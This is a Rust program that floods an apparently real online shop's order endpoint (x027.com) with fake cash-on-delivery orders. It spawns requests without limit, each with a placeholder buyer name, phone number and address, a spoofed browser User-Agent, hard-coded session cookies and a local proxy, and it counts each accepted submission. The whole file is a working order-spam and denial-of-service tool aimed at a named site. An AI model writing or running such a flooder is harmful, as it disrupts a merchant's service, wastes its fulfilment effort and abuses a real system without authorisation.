use reqwest::{
    header::{HeaderMap, COOKIE, USER_AGENT},
    Client, Proxy,
};
use serde::{Deserialize, Serialize};
use std::{
    process::Command,
    sync::{Arc, Mutex},
};
use tokio::task;

#[tokio::main]
async fn main() {
    let url = "https://www.x027.com/notorder_vip.asp";
    let success_num = Arc::new(Mutex::new(0));

    loop {
        let url_clone = url.to_string();
        let success_num_clone = Arc::clone(&success_num);
        let _ = task::spawn(async move {
            match post_info(&url_clone).await {
                Ok(()) => {
                    let mut num = success_num_clone.lock().unwrap();
                    *num += 1;
                    Command::new("clear");
                    println!("Success:{}", *num,);
                }
                Err(_) => (),
            }
        });
    }
}

#[derive(Deserialize, Serialize)]
struct Data {
    business_id: i32,
    pro_id: i32,
    cpa: i32,
    orderid: String,
    num: i32,
    zfbprice: i32,
    price: i32,
    yh_price: i32,
    product: String,
    name: String,
    mob: i64,
    province: String,
    city: String,
    area: String,
    proh: String,
    cityh: String,
    areah: String,
    address: String,
    pay: String,
    ty: i32,
}

impl Data {
    fn new() -> Self {
        Self {
            business_id: 31446,
            pro_id: 47044,
            cpa: 135,
            orderid: "no.7172085547479854556".to_string(),
            num: 1,
            product: "%D2%BB%B4%CE%BC%AF%C6%EB%A1%B6%B5%DA%CB%C4%CC%D7%C8%CB%C3%F1%B1%D2%A1%B7%A3%AC%C6%B7%CF%E0%C9%CF%B3%CB%A3%AC%CE%B2%CB%C4%CF%E0%CD%AC%A3%AC%D4%AD%B0%E6%D4%AD%B3%AE%A3%AC%B2%BB%BF%C9%D4%D9%C9%FA%A3%A11%D5%DB%C7%C0%B9%BA%D6%D0%A3%AC%C8%AB%CC%D710%C3%B6%A3%AC%D4%D9%D4%F9%CB%CD%D3%B2%B1%D250%C3%B6%A3%AC%B9%B260%C3%B61990%D4%AA".to_owned(),
            zfbprice: 199,
            price: 199,
            yh_price: 1791,
            name: "%D5%C5%C8%FD".to_string(),
            mob: 13542422341,
            province: "%B1%B1%BE%A9".to_string(),
            city: "%B1%B1%BE%A9%CA%D0".to_string(),
            area: "%D1%D3%C7%EC%CF%D8".to_string(),
            proh: "%B1%B1%BE%A9".to_string(),
            cityh: "%B1%B1%BE%A9%CA%D0".to_string(),
            areah: "%D1%D3%C7%EC%CF%D8".to_string(),
            address: "ABCD".to_string(),
            pay: "cod".to_string(),
            ty: 1,
        }
    }
}

async fn post_info(url: &str) -> Result<(), Box<dyn std::error::Error>> {
    let data = Data::new();
    let proxy = Proxy::http("http://127.0.0.1:7899")?;
    let client = Client::builder().proxy(proxy).build()?;
    let mut headers = HeaderMap::new();
    headers.insert(USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36".parse().unwrap(),);
    headers.insert(COOKIE, "gzid=dst_XXXX1_07_13_dst_XXXX1; nowurl=https%3A//www.x027.com/e_ldstb7_2.html%3Fgzid%3Ddst_XXXX1_07_13_dst_XXXX1%26t%3DjvZWw; ASPSESSIONIDCQDQSRAT=FAKJCMJANEKFEOEDJPDKHIOG; ASPSESSIONIDSSDRACRQ=GLIBANMAIIHPFFOPDCAOGKAN".parse().unwrap(),);
    client.post(url).json(&data).headers(headers).send().await?;
    Ok(())
}
